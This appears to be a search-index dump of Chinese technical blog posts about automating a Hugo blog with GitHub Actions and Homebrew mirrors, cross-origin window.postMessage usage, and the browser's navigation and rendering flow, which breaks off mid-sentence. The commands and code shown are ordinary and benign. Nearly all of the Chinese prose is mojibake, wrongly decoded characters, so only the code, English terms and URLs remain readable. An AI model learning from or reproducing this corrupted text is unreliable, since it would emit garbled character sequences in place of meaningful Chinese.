æŸ¥çœ‹æ•ˆæœ\nä¸‰ã€åŠŸèƒ½æ‹“å±• issueè¯„è®ºæ’ä»¶utterances: ä½¿ç”¨ã€ç”Ÿæˆé…ç½® hugoè¯­æ³•çºªè¦ å››ã€é‡åˆ°çš„å‘ brew å®‰è£… hugoï¼Œä¸€ç›´ update Supported Tokens ä¸‰ç§æ–¹æ¡ˆ SSH Key å’Œ deploy_key çš„é—®é¢˜ Github Pagesè®¿é—®è¾ƒæ…¢ 1.brew install hugoï¼Œä¸€ç›´ update å›½å†…çš„ç½‘ç»œç¯å¢ƒä¸‹ä½¿ç”¨ Homebrew å®‰è£…è½¯ä»¶çš„è¿‡ç¨‹ä¸­å¯èƒ½ä¼šé•¿æ—¶é—´å¡åœ¨ Updating Homebrew è¿™ä¸ªæ­¥éª¤ ä¾‹ï¼šæ‰§è¡Œ brew install composer å‘½ä»¤\nâœ ~ brew install composer Updating Homebrew... # å¦‚æœç¢°åˆ°é•¿æ—¶é—´å¡åœ¨è¿™é‡Œï¼Œå‚è€ƒä»¥ä¸‹ 2 ç§å¤„ç†æ–¹æ³• 1.1 æ–¹æ³• 1ï¼šæŒ‰ä½ control + c å–æ¶ˆæœ¬æ¬¡æ›´æ–°æ“ä½œ âœ ~ brew install composer Updating Homebrew... ^C æŒ‰ä½ control + c ä¹‹åå‘½ä»¤è¡Œä¼šæ˜¾ç¤º ^Cï¼Œå°±ä»£è¡¨å·²ç»å–æ¶ˆäº† Updating Homebrew æ“ä½œ\nå¤§æ¦‚ä¸åˆ° 1 ç§’é’Ÿä¹‹åå°±ä¼šå»æ‰§è¡Œæˆ‘ä»¬çœŸæ­£éœ€è¦çš„å®‰è£…æ“ä½œäº†\nâœ ~ brew install composer Updating Homebrew... ^C==\u0026gt; Satisfying dependencies ==\u0026gt; Downloading https://getcomposer.org/download/1.7.2/composer.phar ... è¿™ä¸ªæ–¹æ³•æ˜¯ä¸´æ—¶çš„ã€ä¸€æ¬¡æ€§çš„\n1.2 æ–¹æ³• 2ï¼šä½¿ç”¨ Alibaba çš„ Homebrew é•œåƒæºè¿›è¡ŒåŠ é€Ÿ æ‰§è¡Œ brew å‘½ä»¤å®‰è£…è½¯ä»¶çš„æ—¶å€™ï¼Œè·Ÿä»¥ä¸‹ 3 ä¸ªä»“åº“åœ°å€æœ‰å…³\nbrew.git homebrew-core.git homebrew-bottles æ‰€ä»¥ï¼Œ å°†è¿™ 3 ä¸ªä»“åº“åœ°å€å…¨éƒ¨æ›¿æ¢ä¸º Alibaba æä¾›çš„åœ°å€\n# æ›¿æ¢æˆé˜¿é‡Œå·´å·´çš„ brew.git ä»“åº“åœ°å€: cd \u0026#34;$(brew --repo)\u0026#34; git remote set-url origin https://mirrors.aliyun.com/homebrew/brew.git # æ›¿æ¢æˆé˜¿é‡Œå·´å·´çš„ homebrew-core.git ä»“åº“åœ°å€: cd \u0026#34;$(brew --repo)/Library/Taps/homebrew/homebrew-core\u0026#34; git remote set-url origin https://mirrors.aliyun.com/homebrew/homebrew-core.git # æ›¿æ¢ / è¿˜åŸ homebrew-bottles è®¿é—®åœ°å€, è¿™ä¸ªæ­¥éª¤è·Ÿä½ çš„ macOS ç³»ç»Ÿä½¿ç”¨çš„ shell ç‰ˆæœ¬æœ‰å…³ç³» # å¦‚æœä½ çš„è¾“å‡ºç»“æœæ˜¯ /bin/zshï¼Œå‚è€ƒä¸‹æ–¹çš„ zsh ç»ˆç«¯æ“ä½œæ–¹å¼ # å¦‚æœä½ çš„è¾“å‡ºç»“æœæ˜¯ /bin/bashï¼Œå‚è€ƒä¸‹æ–¹çš„ bash ç»ˆç«¯æ“ä½œæ–¹å¼ echo $SHELL # zsh ç»ˆç«¯æ“ä½œæ–¹å¼ï¼Œæ›¿æ¢æˆé˜¿é‡Œå·´å·´çš„ homebrew-bottles è®¿é—®åœ°å€: echo \u0026#39;export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.aliyun.com/homebrew/homebrew-bottles\u0026#39; \u0026gt;\u0026gt; ~/.zshrc source ~/.zshrc # bash ç»ˆç«¯æ“ä½œæ–¹å¼ï¼Œæ›¿æ¢ homebrew-bottles è®¿é—® URL: echo \u0026#39;export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.aliyun.com/homebrew/homebrew-bottles\u0026#39; \u0026gt;\u0026gt; ~/.bash_profile source ~/.bash_profile # ======================================================= # è¿˜åŸä¸ºå®˜æ–¹æä¾›çš„ brew.git ä»“åº“åœ°å€ cd \u0026#34;$(brew --repo)\u0026#34; git remote set-url origin https://github.com/Homebrew/brew.git # è¿˜åŸä¸ºå®˜æ–¹æä¾›çš„ homebrew-core.git ä»“åº“åœ°å€ cd \u0026#34;$(brew --repo)/Library/Taps/homebrew/homebrew-core\u0026#34; git remote set-url origin https://github.com/Homebrew/homebrew-core.git # zsh ç»ˆç«¯æ“ä½œæ–¹å¼ï¼Œè¿˜åŸä¸ºå®˜æ–¹æä¾›çš„ homebrew-bottles è®¿é—®åœ°å€ vi ~/.zshrc # ç„¶åï¼Œåˆ é™¤ HOMEBREW_BOTTLE_DOMAIN è¿™ä¸€è¡Œé…ç½® source ~/.zshrc # bash ç»ˆç«¯æ“ä½œæ–¹å¼ï¼Œè¿˜åŸä¸ºå®˜æ–¹æä¾›çš„ homebrew-bottles è®¿é—®åœ°å€ vi ~/.bash_profile # ç„¶åï¼Œåˆ é™¤ HOMEBREW_BOTTLE_DOMAIN è¿™ä¸€è¡Œé…ç½® source ~/.bash_profile 2.Github Actions å®ç°çš„ä¸‰ç§æ–¹æ¡ˆ github_token deploy_key personal_token ç®€å•æ¥è¯´ï¼Œgithub_token æ›´é€‚åˆ æºç å’Œ public/ å­˜æ”¾åœ¨åŒä¸€ä¸ªä»“åº“ä¸‹ï¼Œæºç æ”¾åœ¨ master åˆ†æ”¯ï¼Œpublic/ å†…å®¹æ”¾åœ¨å¦ä¸€ä¸ªåˆ†æ”¯ï¼ˆå¦‚ gh-pagesï¼‰ï¼Œå¹¶æŒ‡å®šéƒ¨ç½² gh-pages åˆ†æ”¯çš„å†…å®¹ã€‚deploy_key åˆ™æ›´é€‚åˆï¼Œæºç å­˜å‚¨äºä¸€ä¸ªå•ç‹¬çš„ä»“åº“ï¼Œè€Œ public/ å­˜æ”¾åœ¨ä¸»ä»“åº“ xxx.github.io çš„æ¨¡å¼ã€‚\nè¯¦ç»†ä½¿ç”¨å’Œå·®å¼‚ï¼Œå»ºè®®å‚è€ƒ å®˜æ–¹æ–‡æ¡£\n3.SSH Key å’Œ deploy_key çš„é—®é¢˜ é—®é¢˜ï¼šå¸¸è§„æœ¬åœ°å·²ç»å­˜åœ¨å…¬å…±çš„ ssk key, è¿™ä¸ªkey æˆ‘ä»¬å¸¸ç”¨äº gitHub æˆ– gitLab æ•´ä¸ª depository ä¸‹çš„å…¬å…±è®¾ç½®ï¼Œç”¨äº sshä»“åº“ pull / push ä»£ç ã€‚ä½†æ˜¯ï¼Œæˆ‘ä»¬è¿™é‡Œä¹Ÿéœ€è¦ä¸€å¯¹ å…·ä½“ä»“åº“ä¸‹ï¼ˆå³ æºç ä»“åº“blogs å’Œ xxx.github.ioï¼‰çš„deploy_keyã€‚å®˜æ–¹å®Œæ¡£é‡Œæ²¡æœ‰æåŠè¿™ç‚¹ï¼Œæœ€å¼€å§‹ï¼Œæˆ‘æ˜¯ç›´æ¥æŠŠå·²æœ‰çš„push keyæ”¾åˆ°xxx.github.ioä»“åº“å†…ï¼Œå¾ˆæ˜æ˜¾ã€‚ä¼šçˆ†å‡º key å·²è¢«ç”¨çš„é”™è¯¯æç¤ºã€‚æ‰€ä»¥ï¼Œåè¾¹æˆ‘ä»¬é‡æ–°ç”Ÿæˆä¸€å¯¹key, ç”¨äº deploy_key\nssh-keygen -t rsa -C \u0026#34;xxx@foxmail.com\u0026#34; -f ~/.ssh/id_rsa_hugo_deploy 4. Github Pagesè®¿é—®è¾ƒæ…¢ å¯é€šè¿‡è‡ªå®šä¹‰åŸŸå+CDNåŠ å¿«è®¿é—®é€Ÿåº¦\n5. GitHub Actionsè¿œç¨‹æ„å»º: æç¤ºNodeä¸å…¼å®¹åŒ…çš„ warning å…·ä½“é”™è¯¯å¦‚ä¸‹ï¼š\nThe following actions uses node12 which is deprecated and will be forced to run on node16: actions/checkout@v2. For more info\u0026hellip; Node.js 16 actions are deprecated. Please update the following actions to use Node.js 20: actions/checkout@v2, peaceiris/actions-hugo@v2, peaceiris/actions-gh-pages@v3. For more information\u0026hellip; è§£å†³æ–¹æ¡ˆï¼ˆå‡çº§.ymlæ–‡ä»¶ä¸­çš„ä»¥ä¸‹åŒ…ï¼‰ï¼š actions/checkout@v2 -\u0026gt; actions/checkout@v3 æ›´å¤šè¯¦ç»†å†…å®¹å‚è€ƒ å·¥å…·: å¸¸ç”¨çš„GitHub Actions - Blogs\nç›¸å…³å†…å®¹ åšä¸»ç«™ç‚¹ä»“åº“åœ°å€ï¼šhttps://github.com/lianpf/lianpf.github.io å¦‚æœè§‰å¾—è¿™ç¯‡æ–‡ç« æœ‰åŠ©äºä½ ï¼Œéº»çƒ¦gitHubç‚¹ä¸ªstarï¼Œç»™æœ¬æ–‡ç‚¹èµã€‚\nå¦‚è‹¥é‡åˆ°é—®é¢˜ï¼Œå¯åˆ°è¯¥ä»“åº“ä¸‹æissueã€‚\nå‚è€ƒæ–‡ç«  hugoä¸»é¢˜ \u0026ldquo;hugo-theme-dream\u0026rdquo; actions-gh-pages hugoä¸­æ–‡ç½‘ hugo-theme-dreamæ–‡æ¡£ hugoå®˜ç½‘ hexoå®˜ç½‘ æœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\n","permalink":"https://lianpf.github.io/posts/other/github-actions-and-hugo-auto-build-blog/","summary":"ä¸€ã€æ•´ä¸ªæµç¨‹åŠåŸç† 1.ç‰©æ–™ xxx.github.io public ä»“åº“ A å­˜æ”¾ä¸ªäººæºç (åšå®¢æ–‡ç¨¿)","title":"GitHub Action + Hugo è‡ªåŠ¨æ„å»ºå‘å¸ƒä¸ªäººåšå®¢"},{"content":"window.postMessage\u0026hellip;\nä¸€ã€window.postMessage åŸºç¡€è¯­æ³• 1.ä¸ºä»€ä¹ˆä½¿ç”¨ å¯¹äºä¸¤ä¸ªä¸åŒé¡µé¢çš„è„šæœ¬ï¼Œåªæœ‰å½“æ‰§è¡Œå®ƒä»¬çš„é¡µé¢ä½äºå…·æœ‰ç›¸åŒçš„åè®®ï¼ˆé€šå¸¸ä¸ºhttpsï¼‰ï¼Œç«¯å£å·ï¼ˆ443ä¸ºhttpsçš„é»˜è®¤å€¼ï¼‰ï¼Œä»¥åŠä¸»æœº (ä¸¤ä¸ªé¡µé¢çš„æ¨¡æ•°Document.domainè®¾ç½®ä¸ºç›¸åŒçš„å€¼) æ—¶ï¼Œè¿™ä¸¤ä¸ªè„šæœ¬æ‰èƒ½ç›¸äº’é€šä¿¡ã€‚\nwindow.postMessage()åˆ™å®ç°äº†ä¸åŒé¡µé¢è„šæœ¬çš„è·¨åŸŸé€šä¿¡\n2.è¯­æ³• 2-1 å‘é€ otherWindow.postMessage(message, targetOrigin, [transfer]); otherWindow, å…¶ä»–çª—å£çš„ä¸€ä¸ªå¼•ç”¨ iframeçš„contentWindowå±æ€§ æ‰§è¡Œwindow.openè¿”å›çš„çª—å£å¯¹è±¡ å‘½åè¿‡æˆ–æ•°å€¼ç´¢å¼•çš„window.frames message: è¦å‘é€åˆ°å…¶ä»– windowçš„æ•°æ® targetOrigin: æŒ‡å®šå“ªäº›çª—å£èƒ½æ¥æ”¶åˆ°æ¶ˆæ¯äº‹ä»¶, å…¶å€¼å¯ä»¥æ˜¯å­—ç¬¦ä¸²\u0026quot;*\u0026quot;ï¼ˆè¡¨ç¤ºæ— é™åˆ¶ï¼‰æˆ–è€…ä¸€ä¸ªURI 2-2 ç›‘å¬æ¥æ”¶ window.addEventListener(\u0026#34;message\u0026#34;, receiveMessage, false); function receiveMessage(event) { // å®‰å…¨ï¼šå§‹ç»ˆä½¿ç”¨originå’Œsourceå±æ€§éªŒè¯å‘ä»¶äººçš„èº«ä»½ // è¿™é‡Œä¸å‡†ç¡®ï¼Œchromeæ²¡æœ‰è¿™ä¸ªå±æ€§ // var origin = event.origin || event.originalEvent.origin; var origin = event.origin if (origin !== \u0026#34;http://example.org:8080\u0026#34;) return; // ... } message çš„å±æ€§æœ‰:\ndata: ä»å…¶ä»– window ä¸­ä¼ é€’è¿‡æ¥çš„å¯¹è±¡ origin: è°ƒç”¨ postMessage æ—¶æ¶ˆæ¯å‘é€æ–¹çª—å£çš„ origin source: å¯¹å‘é€æ¶ˆæ¯çš„çª—å£å¯¹è±¡çš„å¼•ç”¨; ä½¿ç”¨æ­¤å±æ€§å¯å®ç°ä¸åŒoriginçš„ä¸¤ä¸ªçª—å£åŒå‘é€šä¿¡ äºŒã€å¤šåœºæ™¯é€šä¿¡ å¤šæ ‡ç­¾é¡µé€šä¿¡ iframeåµŒå¥—é€šä¿¡ 1.å¤šæ ‡ç­¾é¡µé€šä¿¡ /* * Açª—å£çš„åŸŸåæ˜¯\u0026lt;http://example.com:8080\u0026gt;ï¼Œä»¥ä¸‹æ˜¯Açª—å£çš„scriptæ ‡ç­¾ä¸‹çš„ä»£ç ï¼š */ var popup = window.open(...popup details...); popup.postMessage(\u0026#34;hello there!\u0026#34;, \u0026#34;http://example.org\u0026#34;); function receiveMessage(event) { // æˆ‘ä»¬èƒ½ç›¸ä¿¡ä¿¡æ¯çš„å‘é€è€…å—? (ä¹Ÿè®¸è¿™ä¸ªå‘é€è€…å’Œæˆ‘ä»¬æœ€åˆæ‰“å¼€çš„ä¸æ˜¯åŒä¸€ä¸ªé¡µé¢). if (event.origin !== \u0026#34;http://example.org\u0026#34;) return; // event.source æ˜¯æˆ‘ä»¬é€šè¿‡window.openæ‰“å¼€çš„å¼¹å‡ºé¡µé¢ popup // event.data æ˜¯ popupå‘é€ç»™å½“å‰é¡µé¢çš„æ¶ˆæ¯ \u0026#34;hi there yourself! the secret response is: rheeeeet!\u0026#34; } window.addEventListener(\u0026#34;message\u0026#34;, receiveMessage, false); /* * å¼¹å‡ºé¡µ popup åŸŸåæ˜¯\u0026lt;http://example.org\u0026gt;ï¼Œä»¥ä¸‹æ˜¯scriptæ ‡ç­¾ä¸­çš„ä»£ç : */ //å½“Aé¡µé¢postMessageè¢«è°ƒç”¨åï¼Œè¿™ä¸ªfunctionè¢«addEventListenerè°ƒç”¨ function receiveMessage(event) { // éªŒè¯äº†æ‰€å—åˆ°ä¿¡æ¯çš„origin if (event.origin !== \u0026#34;http://example.com:8080\u0026#34;) return; // event.source å°±å½“å‰å¼¹å‡ºé¡µçš„æ¥æºé¡µé¢ // event.data æ˜¯ \u0026#34;hello there!\u0026#34; // æŠŠevent.sourceä½œä¸ºå›ä¿¡çš„å¯¹è±¡ï¼Œå¹¶ä¸”æŠŠevent.originä½œä¸ºtargetOrigin event.source.postMessage(\u0026#34;hi there yourself! the secret response \u0026#34; + \u0026#34;is: rheeeeet!\u0026#34;, event.origin); } window.addEventListener(\u0026#34;message\u0026#34;, receiveMessage, false); 2.iframeåµŒå¥—é€šä¿¡ ä¸»åº”ç”¨\n\u0026lt;iframe src=\u0026#39;https://lianpf.github.io\u0026#39; ref=\u0026#39;iframe\u0026#39; id=\u0026#39;iframe\u0026gt;\u0026lt;/iframe\u0026gt; mounted() { this.$refs.iframe.contentWindow.postMessage({type:\u0026#39;initData\u0026#39;, data: this.date}, this.$refs.iframe.src) window.addEventListener( \u0026#39;message\u0026#39;, e =\u0026gt; { // ... }, false ) } iframe: åœ°å€https://lianpf.github.io\nwindow.parent.postMessage({ type: \u0026#39;release\u0026#39;, data: { schema: this.$refs.editor.preview, staticCode: this.$refs.editor.tempCustomJSCode, staticCodeUMD: compileCode } }) mounted/create () { window.addEventListener( \u0026#39;message\u0026#39;, e =\u0026gt; { if(typeof e.data === \u0026#39;string\u0026#39;){ console.log(\u0026#39;ä¼ é€’æ— æ•ˆä¿¡æ¯\u0026#39;) } else { if(e.data.type) { console.log(\u0026#39;æ­£å¸¸å‘é€æ•°æ®\u0026#39;) const receiveData = e.data if (receiveData.type) { // TODO: æ•°æ®åˆ†å‘æ›´æ–°store handleReceiveData(receiveData, vue) } } } }, false ) } å‚è€ƒ window.postMessage - Web API æ¥å£ æœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/frontend-develop/11.use-post_message/","summary":"\u003cp\u003e\u003ccode\u003ewindow.postMessage\u003c/code\u003e\u0026hellip;\u003c/p\u003e","title":"JavaScript: PostMessageä½¿ç”¨"},{"content":"æµè§ˆå™¨è¾“å…¥URLåˆ°â»šé¢å±•ç¤ºå®Œæ•´æµç¨‹ä¸»è¦æ¶‰åŠåˆ°ï¼šæµè§ˆå™¨è¿›ç¨‹ã€ç½‘ç»œè¿›ç¨‹å’Œæ¸²æŸ“è¿›ç¨‹ã€‚å…¶ä¸­\u0026hellip;\nä¸€ã€æ¦‚è¿° å¯¼èˆªæµç¨‹è´Ÿè´£ä»è¾“å…¥URLåˆ°æµè§ˆå™¨è¿›ç¨‹æäº¤æ–‡æ¡£ç»™æ¸²æŸ“è¿›ç¨‹ã€‚æ¸²æŸ“æµç¨‹åˆ™è´Ÿè´£HTMLã€CSSå’ŒJavaScriptç»˜åˆ¶æˆé¡µé¢\nå›¾ï¼šä»è¾“å…¥URLåˆ°â»šé¢å±•ç¤ºå®Œæ•´æµç¨‹ç¤ºæ„å›¾\nå¦‚ä¸Šæ‰€ç¤ºï¼š\næµè§ˆå™¨è¿›ç¨‹ï¼šä¸»è¦è´Ÿè´£ç”¨æˆ¶äº¤äº’ã€å­è¿›ç¨‹ç®¡ç†å’Œæ–‡ä»¶å‚¨å­˜ç­‰åŠŸèƒ½ ç½‘ç»œè¿›ç¨‹ï¼šå‘èµ·HTTPè¯·æ±‚æµç¨‹ä¸ºæ¸²æŸ“è¿›ç¨‹å’Œæµè§ˆå™¨è¿›ç¨‹ç­‰æä¾›ç½‘ç»œä¸‹è½½åŠŸèƒ½ æ¸²æŸ“è¿›ç¨‹ï¼šæŠŠä»ç½‘ç»œä¸‹è½½çš„HTMLã€JavaScriptã€CSSã€å›¾ç‰‡ç­‰èµ„æºï¼Œé€šè¿‡æ¸²æŸ“æµç¨‹è§£æä¸ºå¯æ˜¾ç¤ºå’Œäº¤äº’çš„â»šé¢ æ¸²æŸ“è¿›ç¨‹æ‰€æœ‰çš„å†…å®¹éƒ½æ˜¯é€šè¿‡ç½‘ç»œè·å–çš„ï¼Œä¼šå­˜åœ¨ä¸€äº›æ¶æ„ä»£ç åˆ©ç”¨æµè§ˆå™¨æ¼æ´å¯¹ç³»ç»Ÿè¿›è¡Œæ”»å‡»ï¼Œæ‰€ä»¥è¿è¡Œåœ¨æ¸²æŸ“è¿›ç¨‹é‡Œé¢çš„ä»£ç æ˜¯ä¸è¢«ä¿¡ä»»çš„ã€‚Chromeä¼šè®©æ¸²æŸ“è¿›ç¨‹è¿è¡Œåœ¨å®‰å…¨æ²™ç®±é‡Œä¿è¯ç³»ç»Ÿçš„å®‰å…¨ã€‚Gitee-cloud-notes: è®¡ç®—æœºç½‘ç»œå®‰å…¨\nå…¶ä¸­ï¼Œå¯¼èˆªæµç¨‹æ¶‰åŠåˆ°æµè§ˆå™¨è¿›ç¨‹å’Œç½‘ç»œè¿›ç¨‹ï¼Œæ¸²æŸ“æµç¨‹æ¶‰åŠåˆ°æ¸²æŸ“è¿›ç¨‹\näºŒã€è¯¦è¿°å¯¼èˆªæµç¨‹\u0026amp;æ¸²æŸ“æµç¨‹ æ•´ä¸ªæµç¨‹å¦‚ä¸‹ï¼š\nç”¨æˆ·è¾“å…¥åœ°å€ URLè¯·æ±‚æµç¨‹ æŸ¥ç¼“å­˜ HTTPè¯·æ±‚æµç¨‹: Blog: HTTPè¯·æ±‚æµç¨‹ DNSè§£æ TCPè¿æ¥å’ŒTLSè¿æ¥ æµè§ˆå™¨ç«¯å‘èµ·HTTPè¯·æ±‚å’ŒæœåŠ¡å™¨ç«¯å¤„ç†HTTPè¯·æ±‚ æ–­å¼€TCPè¿æ¥(é•¿è¿æ¥å¾…tabé¡µå…³é—­ï¼Œè‡ªåŠ¨æ–­å¼€TCPè¿æ¥) å‡†å¤‡æ¸²æŸ“è¿›ç¨‹ æäº¤æ–‡æ¡£ æ¸²æŸ“é˜¶æ®µ: HTML Parseã€Recalculate Styleã€Layoutã€Update Layer Treeã€Paintã€Composite Layersã€æ˜¾ç¤º 1ã€ç”¨æˆ·è¾“å…¥åœ°å€ æµè§ˆå™¨è¿›ç¨‹åˆ¤æ–­è¾“å…¥çš„å…³é”®å­—æ˜¯æœç´¢å†…å®¹ï¼Œè¿˜æ˜¯è¯·æ±‚çš„URL\næœç´¢å†…å®¹ï¼šå°†å…¶ç»„è£…è¿›é»˜è®¤æœç´¢å¼•æ“çš„URLä¸­è¿›è¡Œæœç´¢ æ­£åˆ™ç¬¦åˆURLè§„åˆ™ï¼šæ„å»º URL è¯·æ±‚å¹¶é€šè¿‡ IPC é€šä¿¡å°†è¯·æ±‚äº¤ç»™ç½‘ç»œè¿›ç¨‹ã€‚ä»å†å²è®°å½•ã€ä¹¦ç­¾ç­‰ï¼Œæ‰¾åˆ°å·²ç»è¾“å…¥çš„å­—ç¬¦ä¸²å¯èƒ½å¯¹åº”çš„ urlï¼Œç»™å‡ºæ™ºèƒ½æç¤ºï¼Œè®©ä½ å¯ä»¥è¡¥å…¨urlåœ°å€ æ¯”å¦‚è¾“å…¥çš„æ˜¯ time.geekbang.orgï¼Œé‚£ä¹ˆåœ°å€æ ä¼šæ ¹æ®è§„åˆ™ï¼ŒæŠŠè¿™æ®µå†…å®¹åŠ ä¸Šåè®®ï¼Œåˆæˆä¸ºå®Œæ•´çš„URLï¼Œå¦‚ https://time.geekbang.org\nå½“æµè§ˆå™¨åˆšå¼€å§‹åŠ è½½ä¸€ä¸ªåœ°å€ time.geekbang.orgåï¼Œæ ‡ç­¾â»šä¸Šçš„å›¾æ ‡ä¾¿è¿›å…¥åŠ è½½çŠ¶æ€ã€‚ä½†æ­¤æ—¶å½“å‰â»šé¢å¹¶æ²¡ç«‹å³æ›¿æ¢ä¸ºæå®¢æ—¶é—´çš„â»šé¢ï¼Œæ˜¾ç¤ºçš„ä»ç„¶æ˜¯ä¹‹å‰æ‰“å¼€çš„â»šé¢å†…å®¹ã€‚å› ä¸ºéœ€è¦ç­‰å¾…æäº¤æ–‡æ¡£é˜¶æ®µï¼Œâ»šé¢å†…å®¹æ‰ä¼šè¢«æ›¿æ¢\n2ã€URLè¯·æ±‚æµç¨‹ æµè§ˆå™¨è¿›ç¨‹é€šè¿‡è¿›ç¨‹é—´é€šä¿¡(IPC)æŠŠURLè¯·æ±‚å‘é€è‡³ç½‘ç»œè¿›ç¨‹ï¼Œç½‘ç»œè¿›ç¨‹æ¥æ”¶åˆ°URLè¯·æ±‚å‘èµ·çœŸæ­£çš„URLè¯·æ±‚æµç¨‹ã€‚\næŸ¥ç¼“å­˜ï¼šç½‘ç»œè¿›ç¨‹æŸ¥æ‰¾æœ¬åœ°ç¼“å­˜æ˜¯å¦ç¼“å­˜äº†è¯¥èµ„æºï¼Œæœ‰åˆ™ç›´æ¥è¿”å›èµ„æºç»™æµè§ˆå™¨è¿›ç¨‹ã€‚æ— åˆ™è¿›å…¥ç½‘ç»œè¯·æ±‚(HTTPè¯·æ±‚)æµç¨‹ ç½‘ç»œè¯·æ±‚(HTTPè¯·æ±‚)æµç¨‹ DNSè§£æï¼šè·å–è¯·æ±‚åŸŸåçš„æœåŠ¡å™¨IPåœ°å€å’Œç«¯å£ TCPè¿æ¥å’ŒTLSè¿æ¥ è¯·æ±‚åè®®æ˜¯HTTPSï¼Œè¿˜éœ€è¦å»ºç«‹TLSè¿æ¥ åˆ©ç”¨IPåœ°å€å’ŒæœåŠ¡å™¨å»ºç«‹TCPè¿æ¥ï¼Œè¯¥è¿‡ç¨‹å¯èƒ½ä¼šç­‰å¾… TCP é˜Ÿåˆ— å‘èµ·æ„å»ºè¯·æ±‚ï¼šæµè§ˆå™¨ç«¯æ„å»ºè¯·æ±‚è¡Œã€è¯·æ±‚å¤´ç­‰ä¿¡æ¯ï¼Œå¹¶æŠŠå’Œè¯¥åŸŸåç›¸å…³çš„Cookieç­‰æ•°æ®é™„åŠ åˆ°è¯·æ±‚å¤´ä¸­ï¼Œå‘æœåŠ¡å™¨å‘é€æ„å»ºçš„è¯·æ±‚ä¿¡æ¯ æœåŠ¡å™¨å¤„ç†è¯·æ±‚ä¸”å“åº”ï¼šä¼šæ ¹æ®è¯·æ±‚ä¿¡æ¯ç”Ÿæˆå“åº”æ•°æ®(åŒ…æ‹¬å“åº”è¡Œã€å“åº”å¤´å’Œå“åº”ä½“ç­‰ä¿¡æ¯)ï¼Œå¹¶å‘ç»™ç½‘ç»œè¿›ç¨‹ ç½‘ç»œè¿›ç¨‹è§£æå“åº”å¤´ï¼šç½‘ç»œè¿›ç¨‹æ¥æ”¶äº†å“åº”è¡Œå’Œå“åº”å¤´åï¼Œå¼€å§‹è§£æå“åº”å¤´çš„å†…å®¹äº†ã€‚(ä¸ºäº†æ–¹ä¾¿è®²è¿°ï¼Œä¸‹é¢å°†æœåŠ¡å™¨è¿”å›çš„å“åº”å¤´å’Œå“åº”è¡Œç»Ÿç§°ä¸ºå“åº”å¤´) æ ¹æ®çŠ¶æ€ç åšä¸åŒååº”ï¼Œ400ã€500é€šçŸ¥æµè§ˆå™¨è¿›ç¨‹æŠ¥é”™ï¼Œ301ã€302è¿›å…¥é‡å®šå‘ï¼Œ304ç¼“å­˜ï¼Œ200åˆ™æ­£å¸¸ å¦‚æœæ­£å¸¸æˆ–è€…ç¼“å­˜ï¼Œåˆ™è¿›ä¸€æ­¥æŸ¥çœ‹ Content-typeï¼Œé’ˆå¯¹ä¸åŒçš„content-typeï¼Œåšä¸åŒçš„å¤„ç†ã€‚exï¼šapplication/octet-stream äº¤ç»™ä¸‹è½½ç®¡ç†å™¨å¤„ç†ï¼Œtext/html å°±é€šçŸ¥æµè§ˆå™¨è¿›ç¨‹å‡†å¤‡æ¸²æŸ“è¿›ç¨‹ 2.1 DNSè§£æ DNSè§£æè¿‡ç¨‹æ˜¯å¯»æ‰¾æµè§ˆå™¨\u0026quot;æ‰€éœ€èµ„æº\u0026quot;å¯¹åº”æœºå™¨çš„è¿‡ç¨‹ã€‚å½“åœ¨æµè§ˆå™¨ä¸­è¾“å…¥åœ°å€http://www.baidu.comï¼Œä½†è¿™ä¸æ˜¯ç™¾åº¦ç½‘ç«™çœŸæ­£æ„ä¹‰ä¸Šçš„åœ°å€ã€‚äº’è”ç½‘ä¸Šæ¯ä¸€å°è®¡ç®—æœºçš„å”¯ä¸€æ ‡è¯†æ˜¯å®ƒçš„IPåœ°å€ï¼Œä½†IPåœ°å€ä¸ä¾¿è®°å¿†ã€‚æ‰€ä»¥äº’è”ç½‘è®¾è®¡è€…åœ¨ç”¨æˆ·çš„æ–¹ä¾¿æ€§ä¸å¯ç”¨æ€§æ–¹é¢åšä¸€ä¸ªæƒè¡¡ï¼Œåšäº†ä¸€ä¸ªç½‘å€åˆ°IPåœ°å€çš„è½¬æ¢ï¼Œè¿™ä¸ªè¿‡ç¨‹å°±æ˜¯DNSè§£æã€‚è€Œè¿™ä¸ªæ‰€è°“çš„ç½‘å€ä¹Ÿå°±æ˜¯åŸŸå\nDNSæœåŠ¡å™¨åˆ†ä¸º3ä¸ªçº§åˆ«: æ ¹çº§åˆ«DNSã€é¡¶çº§DNSã€è´Ÿè´£æä¾›äºŒçº§åŸŸåçš„DNSæœåŠ¡å™¨IPåœ°å€\nåŸŸåæœ‰ä¸‰ä¸ªéƒ¨åˆ†,ä»¥zhuanlan.zhihu.comä¸ºä¾‹: com æ˜¯é¡¶çº§åŸŸå, zhihuæ˜¯äºŒçº§åŸŸå, zhuanlanæ˜¯ä¸‰çº§åŸŸå(é€šå¸¸è¢«ç§°ä¸ºå­åŸŸå)\næ ¹çº§åˆ«DNSï¼š è´Ÿè´£æä¾›å„ç±»é¡¶çº§åŸŸå(å¦‚:comã€cnã€govã€deuç­‰)å¯¹åº”çš„DNSæœåŠ¡å™¨ipåœ°å€ 